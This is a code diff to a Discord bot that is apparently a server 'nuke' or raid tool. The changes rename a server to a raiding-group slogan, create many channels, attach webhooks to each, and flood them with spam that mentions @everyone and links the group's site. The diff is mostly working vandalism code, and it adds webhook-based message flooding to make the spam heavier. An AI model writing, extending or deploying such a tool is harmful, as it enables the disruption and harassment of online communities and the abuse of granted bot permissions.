@@ -1,6 +1,6 @@
 import { Client, GatewayIntentBits } from "@djs";
 import "https://deno.land/std@0.191.0/dotenv/load.ts";
-import { Interaction, REST, Routes } from "@djs";
+import { Interaction, REST, Routes, TextChannel } from "@djs";
 import { Logger } from "./logger.ts";
 
 const { TOKEN, CLIENT_ID } = Deno.env.toObject();
@@ -72,24 +72,54 @@ https://discord.gg/annycW3Xrk
 
       const max = 32;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-      discordServer?.setIcon(
-        "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
-      );
 
-      for (let i = 0; i < (max / 2); i++) {
-        discordServer?.channels
-          .create({
-            name: (text?.split("\n")[0] ?? "荒らし共栄圏万歳！") + `${i.toString(36)}`,
-            type: 0,
-          })
-          .then(async (channel) => {
-            for (let j = 0; j < max; j++) {
-              await channel.send(
-                (text ??
-                  "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone") + `\n${j.toString(36)}`
-              );
-            }
-          });
+      for (let i = 0; i < max / 2; i++) {
+        try {
+          discordServer?.channels
+            .create({
+              name:
+                (text?.split("\n")[0] ?? "荒らし共栄圏万歳！") +
+                ` ${(i + Math.random()).toString(36)}`,
+              type: 0,
+            })
+            .then(async (channel: TextChannel) => {
+              const webhook = await channel.createWebhook({
+                name:
+                  "荒らし共栄圏 https://ctkpaarr.data.blog#Discord?" +
+                  Math.random().toString(36),
+                avatar:
+                  "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png",
+              });
+
+              const url = webhook.url;
+
+              Logger.log(`Nuke Webhook created. ${url}`, "INFO");
+
+              for (let j = 0; j < max * 3; j++) {
+                try {
+                  await channel.send(
+                    (text ?? "") + ` ${(j + Math.random()).toString(36)}`
+                  );
+
+                  await fetch(url, {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                      content:
+                        (text ?? "") + ` ${(j + Math.random()).toString(36)}`,
+                    }),
+                  });
+                } catch (_e) {
+                  Logger.log(`Channel send failed.`, "WARN");
+                }
+              }
+            });
+        } catch (error) {
+          Logger.log(`Nuke one failed.`, "WARN");
+          Logger.log(error, "WARN");
+        }
       }
     }
   }
